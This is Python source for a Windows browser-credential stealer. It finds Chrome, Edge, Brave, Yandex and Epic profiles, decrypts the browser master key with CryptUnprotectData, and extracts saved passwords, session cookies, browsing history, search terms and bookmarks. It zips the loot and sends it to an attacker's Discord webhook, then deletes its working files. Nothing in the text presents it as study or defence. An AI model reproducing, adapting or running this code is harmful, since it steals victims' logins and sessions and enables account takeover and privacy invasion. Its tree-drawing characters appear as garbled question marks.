import base64
import json
import os
import shutil
import sqlite3
from pathlib import Path
from zipfile import ZipFile

from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from win32crypt import CryptUnprotectData


class chromium:
    def __init__(self, webhook: str) -> None:
        webhook = SyncWebhook.from_url(webhook)

        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
        }
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        # self.working_dir = os.getcwd() + '\\Newmern-vault' 
        self.work_dir = os.getenv('TEMP') + '\\Newmern-vault'
        os.mkdir(self.work_dir)

        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.cur_dir = self.work_dir + '\\' + name
            os.mkdir(self.cur_dir)

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.files = [
                '\\passwords.txt',
                '\\cookies.txt',
                '\\web-history.txt',
                '\\search-history.txt',
                '\\bookmarks.txt',
            ]

            for file in self.files:
                with open(self.cur_dir + file, 'w'):
                    pass

                self.funcs = [
                    self.passwords,
                    self.cookies,
                    self.web_history,
                    self.search_history,
                    self.bookmarks,
                ]

            for profile in self.profiles:
                for func in self.funcs:
                    try:
                        func(name, path, profile, self.cur_dir)
                    except:
                        pass

        with ZipFile(self.work_dir + '.zip', 'w') as zip:
            for root, dirs, files in os.walk(self.work_dir):
                for file in files:
                    zip.write(os.path.join(root, file), os.path.relpath(
                        os.path.join(root, file), self.work_dir))

        embed = Embed(title='Vaults', description='```' +
                      '\n'.join(self.tree(Path(self.work_dir))) + '```', color=0x000000)
        webhook.send(embed=embed, file=File(self.work_dir + '.zip'),
                     username="Emperial", avatar_url="https://imgur.com/t/awesome/RtguoF2")

        shutil.rmtree(self.work_dir)
        os.remove(self.work_dir + '.zip')

    def tree(self, path: Path, prefix: str = '', midfix_folder: str = '???? - ', midfix_file: str = '???? - '):
        pipes = {
            'space':  '    ',
            'branch': '???   ',
            'tee':    '????????? ',
            'last':   '????????? ',
        }

        if prefix == '':
            yield midfix_folder + path.name

        contents = list(path.iterdir())
        pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
        for pointer, path in zip(pointers, contents):
            if path.is_dir():
                yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                yield from self.tree(path, prefix=prefix+extension)
            else:
                yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"

    def get_master_key(self, path: str) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def passwords(self, name: str, path: str, profile: str, work_dir: str) -> None:
        path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return
        vault = work_dir + name.title() + '-Vault.db'
        shutil.copy2(path, vault)
        conn = sqlite3.connect(vault)
        cursor = conn.cursor()
        with open(work_dir + '\\passwords.txt', 'a') as f:
            for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                url, username, password = res
                password = self.decrypt_password(password, self.masterkey)
                if url != "" and username != "" and password != "":
                    f.write("Username: {:<40} Password: {:<40} URL: {}\n".format(
                        username, password, url))

        cursor.close()
        conn.close()
        os.remove(vault)

    def cookies(self, name: str, path: str, profile: str, work_dir: str) -> None:
        path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        vault = work_dir + name.title() + '-Vault.db'
        shutil.copy2(path, vault)
        conn = sqlite3.connect(vault)
        cursor = conn.cursor()
        with open(work_dir + '\\cookies.txt', 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key != "" and name != "" and value != "":
                    f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
                        host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
        cursor.close()
        conn.close()
        os.remove(vault)

    def web_history(self, name: str, path: str, profile: str, work_dir: str) -> None:
        path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        vault = work_dir + name.title() + '-Vault.db'
        shutil.copy2(path, vault)
        conn = sqlite3.connect(vault)
        cursor = conn.cursor()
        with open(work_dir + '\\web-history.txt', 'a', encoding="utf-8") as f:
            sites = []
            for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                url, title, visit_count, last_visit_time = res
                if url != "" and title != "" and visit_count != "" and last_visit_time != "":
                    sites.append((url, title, visit_count, last_visit_time))

            sites.sort(key=lambda x: x[3], reverse=True)
            for site in sites:
                f.write("Visit Count: {:<6} Title: {:<40}\n".format(
                    site[2], site[1]))

        cursor.close()
        conn.close()
        os.remove(vault)

    def search_history(self, name: str, path: str, profile: str, work_dir: str) -> None:
        path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        vault = work_dir + name.title() + '-Vault.db'
        shutil.copy2(path, vault)
        conn = sqlite3.connect(vault)
        cursor = conn.cursor()
        with open(work_dir + '\\search-history.txt', 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT term FROM keyword_search_terms").fetchall():
                term = res[0]
                if term != "":
                    f.write("Search: {}\n".format(term))

        cursor.close()
        conn.close()
        os.remove(vault)

    def bookmarks(self, name: str, path: str, profile: str, work_dir: str) -> None:
        path += '\\' + profile + '\\Bookmarks'
        if not os.path.isfile(path):
            return
        shutil.copy2(path, 'bookmarks.json')
        with open('bookmarks.json', 'r', encoding="utf-8") as f:
            for item in json.loads(f.read())['roots']['bookmark_bar']['children']:
                if 'children' in item:
                    for child in item['children']:
                        if 'url' in child:
                            with open(work_dir + '\\bookmarks.txt', 'a', encoding="utf-8") as f:
                                f.write("URL: {}\n".format(child['url']))
                elif 'url' in item:
                    with open(work_dir + '\\bookmarks.txt', 'a', encoding="utf-8") as f:
                        f.write("URL: {}\n".format(item['url']))

        os.remove('bookmarks.json')